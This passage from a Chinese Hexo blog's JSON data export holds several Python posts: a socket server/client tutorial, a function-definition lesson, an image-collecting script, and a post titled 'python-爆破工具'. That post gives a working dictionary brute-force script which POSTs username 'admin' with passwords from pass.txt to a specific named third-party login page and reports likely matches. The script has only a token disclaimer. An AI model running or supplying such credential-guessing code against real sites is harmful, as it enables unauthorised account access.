class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\">#encoding=utf-8</span></div><div class=\"line\"></div><div class=\"line\">import socket</div><div class=\"line\"></div><div class=\"line\">HOST = <span class=\"string\">'10.0.3.59'</span></div><div class=\"line\">PORT = 8888</div><div class=\"line\"></div><div class=\"line\">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class=\"line\">s.bind((HOST, PORT))</div><div class=\"line\">s.listen(5)</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">'Server start at: %s:%s'</span> %(HOST, PORT)</div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">\"wait for connection...\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">while</span> True:</div><div class=\"line\">\tconn, addr = s.accept()</div><div class=\"line\">\t<span class=\"built_in\">print</span> <span class=\"string\">'Connected by '</span>, addr</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">while</span> True:</div><div class=\"line\">\t\tdata = conn.recv(1024)</div><div class=\"line\">\t\t<span class=\"built_in\">print</span> data</div><div class=\"line\"></div><div class=\"line\">\t\tconn.send(<span class=\"string\">\"server received you message.\"</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># conn.close()</span></div></pre></td></tr></table></figure>\n<h3 id=\"python编写client的步骤：\"><a href=\"#python编写client的步骤：\" class=\"headerlink\" title=\"python编写client的步骤：\"></a>python编写client的步骤：</h3><ol>\n<li>创建一个socket以连接服务器：socket = socket.socket( family, type )</li>\n</ol>\n<p>2.使用socket的connect方法连接服务器。对于AF_INET家族,连接格式如下：</p>\n<p>socket.connect( (host,port) )</p>\n<p>host代表服务器主机名或IP，port代表服务器进程所绑定的端口号。如连接成功，客户就可通过套接字与服务器通信，如果连接失败，会引发socket.error异常。</p>\n<ol>\n<li><p>处理阶段，客户和服务器将通过send方法和recv方法通信。</p>\n</li>\n<li><p>传输结束，客户通过调用socket的close方法关闭连接。</p>\n</li>\n</ol>\n<h3 id=\"客户端代码\"><a href=\"#客户端代码\" class=\"headerlink\" title=\"客户端代码\"></a>客户端代码</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\">#coding=utf-8</span></div><div class=\"line\"></div><div class=\"line\">import socket</div><div class=\"line\">HOST=<span class=\"string\">'10.0.3.59'</span></div><div class=\"line\">PORT=8888</div><div class=\"line\"></div><div class=\"line\">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class=\"line\">s.connect((HOST, PORT))</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">while</span> True:</div><div class=\"line\">\tcmd=raw_input(<span class=\"string\">\"Please input msg:\"</span>)</div><div class=\"line\">\ts.send(cmd)</div><div class=\"line\">\tdata=s.recv(1024)</div><div class=\"line\">\t<span class=\"built_in\">print</span> data</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#s.close()</span></div></pre></td></tr></table></figure>\n<p><img src=\"/upload_image/socket.jpg\" alt=\"picture\"></p>\n<p>more info<a href=\"https://gist.github.com/kevinkindom/108ffd675cb9253f8f71\" target=\"_blank\" rel=\"external\">info1</a><br>more info<a href=\"http://yangrong.blog.51cto.com/6945369/1339593\" target=\"_blank\" rel=\"external\">info2</a></p>\n<h3 id=\"sign-bman\"><a href=\"#sign-bman\" class=\"headerlink\" title=\"sign:bman\"></a>sign:bman</h3>"},{"title":"python-爆破工具","date":"2016-12-23T03:28:09.000Z","_content":"写这个工具的目的是为了爆破哪些发包需要经过一次302跳转的登陆地址，利用python写比较容易，所以就拿来练手。以后毕竟还要用，估计会继续完善。但是中间有两点问题：\n1. 发包的速度比较慢，如果需要的话可以采用多线程的方式。\n2. 由于网络不稳定的原因，对于内容比较大的字典爆破可能会中断，错误码10060.\n这个问题还需要研究一下。\n![chritsmas](/upload_image/lu33.jpg)\n## 一更\n### 源码：\n```bash\n#!coding=utf-8\n\nimport urllib2\nimport urllib\n\nList=open(\"pass.txt\",'r')\t\t#加入/修改字典\n\nlst=List.readlines()\t\t\t#读取文件中的所有行并返回一个列表，并赋值给lst\nfor psd in lst:\n\tpostdata=urllib.urlencode({\n\t\t'username':'admin',\n\t\t'password':psd,\n\t})\t\t\t\t\t\t\t\t\t#提交post数据\n\tprint 'password is: '+ str(psd)\t\t#输出用来爆破的密码，用户名为admin\n\treq=urllib2.Request(\n\t\turl='http://www.chinanews-info.com/pub/index.jsp?fail=3',\n\t\tdata=postdata\n\t)\t\t\t\t\t\t\t\t\t#在这里加入/修改爆破的网址\n\tresponse=urllib2.urlopen(req)\t\t#赋值回包给response\n\tthe_page=response.read()\t\t\t#读取回包的数据\n\n\titem='用户密码错误'\n\tif item in the_page:\n\t\tprint u'密码不正确，继续破解--'\n\telse:\n\t\tprint u'密码可能是: '+ str(psd)\n\n```\n---\n工具有待改进，毕竟自己以后还是需要用到的，最后补充一句：请勿利用该工具进行非法操作，出现任何问题概不负责。\n---\n\n### sign:bman","source":"_posts/python-爆破工具.md","raw":"---\ntitle: python-爆破工具\ndate: 2016-12-23 11:28:09\ntags:\n---\n写这个工具的目的是为了爆破哪些发包需要经过一次302跳转的登陆地址，利用python写比较容易，所以就拿来练手。以后毕竟还要用，估计会继续完善。但是中间有两点问题：\n1. 发包的速度比较慢，如果需要的话可以采用多线程的方式。\n2. 由于网络不稳定的原因，对于内容比较大的字典爆破可能会中断，错误码10060.\n这个问题还需要研究一下。\n![chritsmas](/upload_image/lu33.jpg)\n## 一更\n### 源码：\n```bash\n#!coding=utf-8\n\nimport urllib2\nimport urllib\n\nList=open(\"pass.txt\",'r')\t\t#加入/修改字典\n\nlst=List.readlines()\t\t\t#读取文件中的所有行并返回一个列表，并赋值给lst\nfor psd in lst:\n\tpostdata=urllib.urlencode({\n\t\t'username':'admin',\n\t\t'password':psd,\n\t})\t\t\t\t\t\t\t\t\t#提交post数据\n\tprint 'password is: '+ str(psd)\t\t#输出用来爆破的密码，用户名为admin\n\treq=urllib2.Request(\n\t\turl='http://www.chinanews-info.com/pub/index.jsp?fail=3',\n\t\tdata=postdata\n\t)\t\t\t\t\t\t\t\t\t#在这里加入/修改爆破的网址\n\tresponse=urllib2.urlopen(req)\t\t#赋值回包给response\n\tthe_page=response.read()\t\t\t#读取回包的数据\n\n\titem='用户密码错误'\n\tif item in the_page:\n\t\tprint u'密码不正确，继续破解--'\n\telse:\n\t\tprint u'密码可能是: '+ str(psd)\n\n```\n---\n工具有待改进，毕竟自己以后还是需要用到的，最后补充一句：请勿利用该工具进行非法操作，出现任何问题概不负责。\n---\n\n### sign:bman","slug":"python-爆破工具","published":1,"updated":"2017-05-31T07:58:06.618Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g11x0007joo59jy11d3a","content":"<p>写这个工具的目的是为了爆破哪些发包需要经过一次302跳转的登陆地址，利用python写比较容易，所以就拿来练手。以后毕竟还要用，估计会继续完善。但是中间有两点问题：</p>\n<ol>\n<li>发包的速度比较慢，如果需要的话可以采用多线程的方式。</li>\n<li>由于网络不稳定的原因，对于内容比较大的字典爆破可能会中断，错误码10060.<br>这个问题还需要研究一下。<br><img src=\"/upload_image/lu33.jpg\" alt=\"chritsmas\"><h2 id=\"一更\"><a href=\"#一更\" class=\"headerlink\" title=\"一更\"></a>一更</h2><h3 id=\"源码：\"><a href=\"#源码：\" class=\"headerlink\" title=\"源码：\"></a>源码：</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!coding=utf-8</span></div><div class=\"line\"></div><div class=\"line\">import urllib2</div><div class=\"line\">import urllib</div><div class=\"line\"></div><div class=\"line\">List=open(<span class=\"string\">\"pass.txt\"</span>,<span class=\"string\">'r'</span>)\t\t<span class=\"comment\">#加入/修改字典</span></div><div class=\"line\"></div><div class=\"line\">lst=List.readlines()\t\t\t<span class=\"comment\">#读取文件中的所有行并返回一个列表，并赋值给lst</span></div><div class=\"line\"><span class=\"keyword\">for</span> psd <span class=\"keyword\">in</span> lst:</div><div class=\"line\">\tpostdata=urllib.urlencode(&#123;</div><div class=\"line\">\t\t<span class=\"string\">'username'</span>:<span class=\"string\">'admin'</span>,</div><div class=\"line\">\t\t<span class=\"string\">'password'</span>:psd,</div><div class=\"line\">\t&#125;)\t\t\t\t\t\t\t\t\t<span class=\"comment\">#提交post数据</span></div><div class=\"line\">\t<span class=\"built_in\">print</span> <span class=\"string\">'password is: '</span>+ str(psd)\t\t<span class=\"comment\">#输出用来爆破的密码，用户名为admin</span></div><div class=\"line\">\treq=urllib2.Request(</div><div class=\"line\">\t\turl=<span class=\"string\">'http://www.chinanews-info.com/pub/index.jsp?fail=3'</span>,</div><div class=\"line\">\t\tdata=postdata</div><div class=\"line\">\t)\t\t\t\t\t\t\t\t\t<span class=\"comment\">#在这里加入/修改爆破的网址</span></div><div class=\"line\">\tresponse=urllib2.urlopen(req)\t\t<span class=\"comment\">#赋值回包给response</span></div><div class=\"line\">\tthe_page=response.read()\t\t\t<span class=\"comment\">#读取回包的数据</span></div><div class=\"line\"></div><div class=\"line\">\titem=<span class=\"string\">'用户密码错误'</span></div><div class=\"line\">\t<span class=\"keyword\">if</span> item <span class=\"keyword\">in</span> the_page:</div><div class=\"line\">\t\t<span class=\"built_in\">print</span> u<span class=\"string\">'密码不正确，继续破解--'</span></div><div class=\"line\">\t<span class=\"keyword\">else</span>:</div><div class=\"line\">\t\t<span class=\"built_in\">print</span> u<span class=\"string\">'密码可能是: '</span>+ str(psd)</div></pre></td></tr></table></figure>\n</li>\n</ol>\n<hr>\n<h2 id=\"工具有待改进，毕竟自己以后还是需要用到的，最后补充一句：请勿利用该工具进行非法操作，出现任何问题概不负责。\"><a href=\"#工具有待改进，毕竟自己以后还是需要用到的，最后补充一句：请勿利用该工具进行非法操作，出现任何问题概不负责。\" class=\"headerlink\" title=\"工具有待改进，毕竟自己以后还是需要用到的，最后补充一句：请勿利用该工具进行非法操作，出现任何问题概不负责。\"></a>工具有待改进，毕竟自己以后还是需要用到的，最后补充一句：请勿利用该工具进行非法操作，出现任何问题概不负责。</h2><h3 id=\"sign-bman\"><a href=\"#sign-bman\" class=\"headerlink\" title=\"sign:bman\"></a>sign:bman</h3>","site":{"data":{}},"excerpt":"","more":"<p>写这个工具的目的是为了爆破哪些发包需要经过一次302跳转的登陆地址，利用python写比较容易，所以就拿来练手。以后毕竟还要用，估计会继续完善。但是中间有两点问题：</p>\n<ol>\n<li>发包的速度比较慢，如果需要的话可以采用多线程的方式。</li>\n<li>由于网络不稳定的原因，对于内容比较大的字典爆破可能会中断，错误码10060.<br>这个问题还需要研究一下。<br><img src=\"/upload_image/lu33.jpg\" alt=\"chritsmas\"><h2 id=\"一更\"><a href=\"#一更\" class=\"headerlink\" title=\"一更\"></a>一更</h2><h3 id=\"源码：\"><a href=\"#源码：\" class=\"headerlink\" title=\"源码：\"></a>源码：</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!coding=utf-8</span></div><div class=\"line\"></div><div class=\"line\">import urllib2</div><div class=\"line\">import urllib</div><div class=\"line\"></div><div class=\"line\">List=open(<span class=\"string\">\"pass.txt\"</span>,<span class=\"string\">'r'</span>)\t\t<span class=\"comment\">#加入/修改字典</span></div><div class=\"line\"></div><div class=\"line\">lst=List.readlines()\t\t\t<span class=\"comment\">#读取文件中的所有行并返回一个列表，并赋值给lst</span></div><div class=\"line\"><span class=\"keyword\">for</span> psd <span class=\"keyword\">in</span> lst:</div><div class=\"line\">\tpostdata=urllib.urlencode(&#123;</div><div class=\"line\">\t\t<span class=\"string\">'username'</span>:<span class=\"string\">'admin'</span>,</div><div class=\"line\">\t\t<span class=\"string\">'password'</span>:psd,</div><div class=\"line\">\t&#125;)\t\t\t\t\t\t\t\t\t<span class=\"comment\">#提交post数据</span></div><div class=\"line\">\t<span class=\"built_in\">print</span> <span class=\"string\">'password is: '</span>+ str(psd)\t\t<span class=\"comment\">#输出用来爆破的密码，用户名为admin</span></div><div class=\"line\">\treq=urllib2.Request(</div><div class=\"line\">\t\turl=<span class=\"string\">'http://www.chinanews-info.com/pub/index.jsp?fail=3'</span>,</div><div class=\"line\">\t\tdata=postdata</div><div class=\"line\">\t)\t\t\t\t\t\t\t\t\t<span class=\"comment\">#在这里加入/修改爆破的网址</span></div><div class=\"line\">\tresponse=urllib2.urlopen(req)\t\t<span class=\"comment\">#赋值回包给response</span></div><div class=\"line\">\tthe_page=response.read()\t\t\t<span class=\"comment\">#读取回包的数据</span></div><div class=\"line\"></div><div class=\"line\">\titem=<span class=\"string\">'用户密码错误'</span></div><div class=\"line\">\t<span class=\"keyword\">if</span> item <span class=\"keyword\">in</span> the_page:</div><div class=\"line\">\t\t<span class=\"built_in\">print</span> u<span class=\"string\">'密码不正确，继续破解--'</span></div><div class=\"line\">\t<span class=\"keyword\">else</span>:</div><div class=\"line\">\t\t<span class=\"built_in\">print</span> u<span class=\"string\">'密码可能是: '</span>+ str(psd)</div></pre></td></tr></table></figure>\n</li>\n</ol>\n<hr>\n<h2 id=\"工具有待改进，毕竟自己以后还是需要用到的，最后补充一句：请勿利用该工具进行非法操作，出现任何问题概不负责。\"><a href=\"#工具有待改进，毕竟自己以后还是需要用到的，最后补充一句：请勿利用该工具进行非法操作，出现任何问题概不负责。\" class=\"headerlink\" title=\"工具有待改进，毕竟自己以后还是需要用到的，最后补充一句：请勿利用该工具进行非法操作，出现任何问题概不负责。\"></a>工具有待改进，毕竟自己以后还是需要用到的，最后补充一句：请勿利用该工具进行非法操作，出现任何问题概不负责。</h2><h3 id=\"sign-bman\"><a href=\"#sign-bman\" class=\"headerlink\" title=\"sign:bman\"></a>sign:bman</h3>"},{"title":"python--自定义函数","date":"2016-09-27T06:17:23.000Z","_content":"python的自定义函数创建方法：首先把功能写好，然后直接使用函数语法，调用函数即可。关键一步是在函数的功能上。\n\n## Quick Start\n\n### python函数的语法：\n``` bash\ndef function_name(arguments):\n\t\"function_documentation_string\"     #函数声明\n\tfunction_body_suite\t\t#定义体\n```\n\n### 写好的功能语句：\n``` bash\n'rtf -- read text filename'\nfname=raw_input('Enter filname: ')\nprint 'we are going to... '\n# attempt to open file for reading\ntry:\n\tfobj=open(fname, 'r')\nexcept IOError, e:\n\tprint \"*** file open error:\", e\nelse:\n\tfor eachline in fobj:\n\t\tstr=eachline\n\t\tprint str.strip('')\n\tfobj.close()\n```\n\n### 改成函数rtf():\n``` bash\ndef rtf():\n\t'rtf -- read text filename'\n\tfname=raw_input('Enter filname: ')\n\tprint 'we are going to... '\n\t# attempt to open file for reading\n\ttry:\n\t\tfobj=open(fname, 'r')\n\texcept IOError, e:\n\t\tprint \"*** file open error:\", e\n\telse:\n\t\tfor eachline in fobj:\n\t\t\tstr=eachline\n\t\t\tprint str.strip('')\n\t\tfobj.close()\nrtf()\n```\n\n### sign:bman","source":"_posts/python-自定义函数.md","raw":"---\ntitle: python--自定义函数\ndate: 2016-09-27 14:17:23\ntags:\n---\npython的自定义函数创建方法：首先把功能写好，然后直接使用函数语法，调用函数即可。关键一步是在函数的功能上。\n\n## Quick Start\n\n### python函数的语法：\n``` bash\ndef function_name(arguments):\n\t\"function_documentation_string\"     #函数声明\n\tfunction_body_suite\t\t#定义体\n```\n\n### 写好的功能语句：\n``` bash\n'rtf -- read text filename'\nfname=raw_input('Enter filname: ')\nprint 'we are going to... '\n# attempt to open file for reading\ntry:\n\tfobj=open(fname, 'r')\nexcept IOError, e:\n\tprint \"*** file open error:\", e\nelse:\n\tfor eachline in fobj:\n\t\tstr=eachline\n\t\tprint str.strip('')\n\tfobj.close()\n```\n\n### 改成函数rtf():\n``` bash\ndef rtf():\n\t'rtf -- read text filename'\n\tfname=raw_input('Enter filname: ')\n\tprint 'we are going to... '\n\t# attempt to open file for reading\n\ttry:\n\t\tfobj=open(fname, 'r')\n\texcept IOError, e:\n\t\tprint \"*** file open error:\", e\n\telse:\n\t\tfor eachline in fobj:\n\t\t\tstr=eachline\n\t\t\tprint str.strip('')\n\t\tfobj.close()\nrtf()\n```\n\n### sign:bman","slug":"python-自定义函数","published":1,"updated":"2017-05-31T07:58:06.619Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g1250008joo5wsgfia56","content":"<p>python的自定义函数创建方法：首先把功能写好，然后直接使用函数语法，调用函数即可。关键一步是在函数的功能上。</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"python函数的语法：\"><a href=\"#python函数的语法：\" class=\"headerlink\" title=\"python函数的语法：\"></a>python函数的语法：</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">def function_name(arguments):</div><div class=\"line\">\t<span class=\"string\">\"function_documentation_string\"</span>     <span class=\"comment\">#函数声明</span></div><div class=\"line\">\tfunction_body_suite\t\t<span class=\"comment\">#定义体</span></div></pre></td></tr></table></figure>\n<h3 id=\"写好的功能语句：\"><a href=\"#写好的功能语句：\" class=\"headerlink\" title=\"写好的功能语句：\"></a>写好的功能语句：</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"string\">'rtf -- read text filename'</span></div><div class=\"line\">fname=raw_input(<span class=\"string\">'Enter filname: '</span>)</div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">'we are going to... '</span></div><div class=\"line\"><span class=\"comment\"># attempt to open file for reading</span></div><div class=\"line\">try:</div><div class=\"line\">\tfobj=open(fname, <span class=\"string\">'r'</span>)</div><div class=\"line\">except IOError, e:</div><div class=\"line\">\t<span class=\"built_in\">print</span> <span class=\"string\">\"*** file open error:\"</span>, e</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">\t<span class=\"keyword\">for</span> eachline <span class=\"keyword\">in</span> fobj:</div><div class=\"line\">\t\tstr=eachline</div><div class=\"line\">\t\t<span class=\"built_in\">print</span> str.strip(<span class=\"string\">''</span>)</div><div class=\"line\">\tfobj.close()</div></pre></td></tr></table></figure>\n<h3 id=\"改成函数rtf\"><a href=\"#改成函数rtf\" class=\"headerlink\" title=\"改成函数rtf():\"></a>改成函数rtf():</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\">def rtf():</div><div class=\"line\">\t<span class=\"string\">'rtf -- read text filename'</span></div><div class=\"line\">\tfname=raw_input(<span class=\"string\">'Enter filname: '</span>)</div><div class=\"line\">\t<span class=\"built_in\">print</span> <span class=\"string\">'we are going to... '</span></div><div class=\"line\">\t<span class=\"comment\"># attempt to open file for reading</span></div><div class=\"line\">\ttry:</div><div class=\"line\">\t\tfobj=open(fname, <span class=\"string\">'r'</span>)</div><div class=\"line\">\texcept IOError, e:</div><div class=\"line\">\t\t<span class=\"built_in\">print</span> <span class=\"string\">\"*** file open error:\"</span>, e</div><div class=\"line\">\t<span class=\"keyword\">else</span>:</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> eachline <span class=\"keyword\">in</span> fobj:</div><div class=\"line\">\t\t\tstr=eachline</div><div class=\"line\">\t\t\t<span class=\"built_in\">print</span> str.strip(<span class=\"string\">''</span>)</div><div class=\"line\">\t\tfobj.close()</div><div class=\"line\">rtf()</div></pre></td></tr></table></figure>\n<h3 id=\"sign-bman\"><a href=\"#sign-bman\" class=\"headerlink\" title=\"sign:bman\"></a>sign:bman</h3>","site":{"data":{}},"excerpt":"","more":"<p>python的自定义函数创建方法：首先把功能写好，然后直接使用函数语法，调用函数即可。关键一步是在函数的功能上。</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"python函数的语法：\"><a href=\"#python函数的语法：\" class=\"headerlink\" title=\"python函数的语法：\"></a>python函数的语法：</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">def function_name(arguments):</div><div class=\"line\">\t<span class=\"string\">\"function_documentation_string\"</span>     <span class=\"comment\">#函数声明</span></div><div class=\"line\">\tfunction_body_suite\t\t<span class=\"comment\">#定义体</span></div></pre></td></tr></table></figure>\n<h3 id=\"写好的功能语句：\"><a href=\"#写好的功能语句：\" class=\"headerlink\" title=\"写好的功能语句：\"></a>写好的功能语句：</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"string\">'rtf -- read text filename'</span></div><div class=\"line\">fname=raw_input(<span class=\"string\">'Enter filname: '</span>)</div><div class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">'we are going to... '</span></div><div class=\"line\"><span class=\"comment\"># attempt to open file for reading</span></div><div class=\"line\">try:</div><div class=\"line\">\tfobj=open(fname, <span class=\"string\">'r'</span>)</div><div class=\"line\">except IOError, e:</div><div class=\"line\">\t<span class=\"built_in\">print</span> <span class=\"string\">\"*** file open error:\"</span>, e</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">\t<span class=\"keyword\">for</span> eachline <span class=\"keyword\">in</span> fobj:</div><div class=\"line\">\t\tstr=eachline</div><div class=\"line\">\t\t<span class=\"built_in\">print</span> str.strip(<span class=\"string\">''</span>)</div><div class=\"line\">\tfobj.close()</div></pre></td></tr></table></figure>\n<h3 id=\"改成函数rtf\"><a href=\"#改成函数rtf\" class=\"headerlink\" title=\"改成函数rtf():\"></a>改成函数rtf():</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\">def rtf():</div><div class=\"line\">\t<span class=\"string\">'rtf -- read text filename'</span></div><div class=\"line\">\tfname=raw_input(<span class=\"string\">'Enter filname: '</span>)</div><div class=\"line\">\t<span class=\"built_in\">print</span> <span class=\"string\">'we are going to... '</span></div><div class=\"line\">\t<span class=\"comment\"># attempt to open file for reading</span></div><div class=\"line\">\ttry:</div><div class=\"line\">\t\tfobj=open(fname, <span class=\"string\">'r'</span>)</div><div class=\"line\">\texcept IOError, e:</div><div class=\"line\">\t\t<span class=\"built_in\">print</span> <span class=\"string\">\"*** file open error:\"</span>, e</div><div class=\"line\">\t<span class=\"keyword\">else</span>:</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> eachline <span class=\"keyword\">in</span> fobj:</div><div class=\"line\">\t\t\tstr=eachline</div><div class=\"line\">\t\t\t<span class=\"built_in\">print</span> str.strip(<span class=\"string\">''</span>)</div><div class=\"line\">\t\tfobj.close()</div><div class=\"line\">rtf()</div></pre></td></tr></table></figure>\n<h3 id=\"sign-bman\"><a href=\"#sign-bman\" class=\"headerlink\" title=\"sign:bman\"></a>sign:bman</h3>"},{"title":"python小工具--图片收集","date":"2016-09-30T08:34:37.000Z","_content":"It's the second step of my final instrument, this code is using to catch the picture in your computer and\ncopy it to a new fold. Waiting for my next step.\n\n## A cup of tea:\n\n### code:\n``` bash\n#!/usr/bin/env pthon\n#coding=utf-8\n\nimport os, string, shutil\n'These code is about create a new fold and copy the .jpg to this fold'\n\ndef mkdir(paths):\n\n    paths=paths.strip()      # 去除首位空格\n    # 去除尾部 \\ 符号\n    # paths=paths.rstrip(\"\\\\\")\n \n    isExists=os.path.exists(paths)  # 判断路径是否存在，存在（True）,不存在（False）\n\n    if not isExists:\n        # 如果不存在则创建目录\n        print paths\n        # 创建目录操作函数\n        os.makedirs(paths)\n        return True\n    else:\n        # 如果目录存在则不创建，并提示目录已存在\n        print paths+' Already Created'\n        return False\n \n# 定义要创建的目录\nmkpaths=\"e:\\\\12345678\\\\\"\n#调用函数生成目录\nmkdir(mkpaths)\n\n\ndef get_imlist(path):\n\t'return a list of file path'\n\tif os.path.isdir(path):\n\t\tfiles=os.listdir(path)        #列出文件目录\n\t\tfor f in files:\n\t\t\tf=os.path.join(path,f)\t#关联文件和目录，形成路径\n\t\t\tget_imlist(f)\n\telif os.path.isfile(path):\n\t\tif path.endswith('.jpg'):\t#判断文件名为.jpg结尾的文件\n\t\t\tprint path\n\t\t\tfname=os.path.basename(path)    #返回文件名\n\t\t\tnew_f=mkpaths+fname\t\t\t\t#在mkpath目录下创建相应文件\n\t\t\tshutil.copyfile(path,new_f)\t\t#从path文件复制数据到new_f\n\npath = raw_input(\"Enter path: \")\nget_imlist(path)\n\n```\n![鹿神](/upload_image/lu22.jpg)\n\n### sign:bman","source":"_posts/python小工具-图片收集.md","raw":"---\ntitle: python小工具--图片收集\ndate: 2016-09-30 16:34:37\ntags:\n---\nIt's the second step of my final instrument, this code is using to catch the picture in your computer and\ncopy it to a new fold. Waiting for my next step.\n\n## A cup of tea:\n\n### code:\n``` bash\n#!/usr/bin/env pthon\n#coding=utf-8\n\nimport os, string, shutil\n'These code is about create a new fold and copy the .jpg to this fold'\n\ndef mkdir(paths):\n\n    paths=paths.strip()      # 去除首位空格\n    # 去除尾部 \\ 符号\n    # paths=paths.rstrip(\"\\\\\")\n \n    isExists=os.path.exists(paths)  # 判断路径是否存在，存在（True）,不存在（False）\n\n    if not isExists:\n        # 如果不存在则创建目录\n        print paths\n        # 创建目录操作函数\n        os.makedirs(paths)\n        return True\n    else:\n        # 如果目录存在则不创建，并提示目录已存在\n        print paths+' Already Created'\n        return False\n \n# 定义要创建的目录\nmkpaths=\"e:\\\\12345678\\\\\"\n#调用函数生成目录\nmkdir(mkpaths)\n\n\ndef get_imlist(path):\n\t'return a list of file path'\n\tif os.path.isdir(path):\n\t\tfiles=os.listdir(path)        #列出文件目录\n\t\tfor f in files:\n\t\t\tf=os.path.join(path,f)\t#关联文件和目录，形成路径\n\t\t\tget_imlist(f)\n\telif os.path.isfile(path):\n\t\tif path.endswith('.jpg'):\t#判断文件名为.jpg结尾的文件\n\t\t\tprint path\n\t\t\tfname=os.path.basename(path)    #返回文件名\n\t\t\tnew_f=mkpaths+fname\t\t\t\t#在mkpath目录下创建相应文件\n\t\t\tshutil.copyfile(path,new_f)\t\t#从path文件复制数据到new_f\n\npath = raw_input(\"Enter path: \")\nget_imlist(path)\n\n```\n![鹿神](/upload_image/lu22.jpg)\n\n### 